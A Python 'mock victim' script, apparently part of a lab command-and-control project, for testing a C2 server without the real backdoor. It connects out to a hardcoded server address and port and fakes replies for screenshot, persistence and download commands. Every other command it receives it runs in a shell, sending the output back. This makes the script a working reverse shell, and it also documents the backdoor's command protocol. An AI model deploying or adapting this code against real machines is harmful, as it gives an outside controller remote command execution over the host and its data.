"""
Mock victim to test the C2 server without needing the compiled backdoor.
Run this on the SAME Kali machine to verify the server is working.

Usage:  python3 mock_victim.py
"""
import socket
import time
import sys

SERVER_IP = "192.168.56.104"
SERVER_PORT = 50005

def main():
    print(f"[*] Connecting to {SERVER_IP}:{SERVER_PORT}...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        print("[+] Connected!")
    except Exception as e:
        print(f"[!] Connection FAILED: {e}")
        print(f"    -> Is app.py running?")
        print(f"    -> Does {SERVER_IP} exist on this machine? Try 127.0.0.1")
        sys.exit(1)

    # Send banner + newline (just like backdoor3o.c)
    banner = "MockVictim-Connected\n"
    s.sendall(banner.encode())
    print(f"[+] Sent banner: {banner.strip()}")

    # Command loop - just like CmdShell in backdoor3o.c
    while True:
        print("[*] Waiting for command...")
        try:
            data = s.recv(1024)
            if not data:
                print("[!] Server closed connection")
                break

            cmd = data.decode(errors="ignore").strip()
            print(f"[<] Received command: '{cmd}'")

            if cmd == "q":
                print("[*] Quit command received")
                break

            elif cmd == "screenshot":
                # Send a tiny fake BMP
                fake_bmp = b"BM" + b"\x00" * 52  # minimal 54-byte BMP header
                size_str = f"{len(fake_bmp)}\n"
                s.sendall(size_str.encode())
                time.sleep(0.5)
                s.sendall(fake_bmp)
                print(f"[>] Sent fake screenshot ({len(fake_bmp)} bytes)")
                continue  # no trailing \n, matching backdoor behavior

            elif cmd == "persist":
                msg = "Persistence re-installed!\n"
                s.sendall(msg.encode())
                print(f"[>] Sent: {msg.strip()}")
                continue  # no trailing \n, matching backdoor behavior

            elif cmd.startswith("cd "):
                # cd doesn't produce output, just the terminator
                pass

            elif cmd.startswith("download "):
                # Send "file not found"
                s.sendall(b"0\n")
                print("[>] Sent: file not found (0)")
                continue

            else:
                # Generic command - simulate output
                import subprocess
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=5
                    )
                    output = result.stdout or "(no output from command)\n"
                    s.sendall(output.encode())
                    print(f"[>] Sent {len(output)} bytes of output")
                except Exception as e:
                    err_msg = f"Command failed: {e}\n"
                    s.sendall(err_msg.encode())

            # Send empty line as terminator (matches backdoor3o.c behavior)
            s.sendall(b"\n")
            print("[>] Sent terminator \\n")

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    s.close()
    print("[*] Disconnected.")

if __name__ == "__main__":
    main()
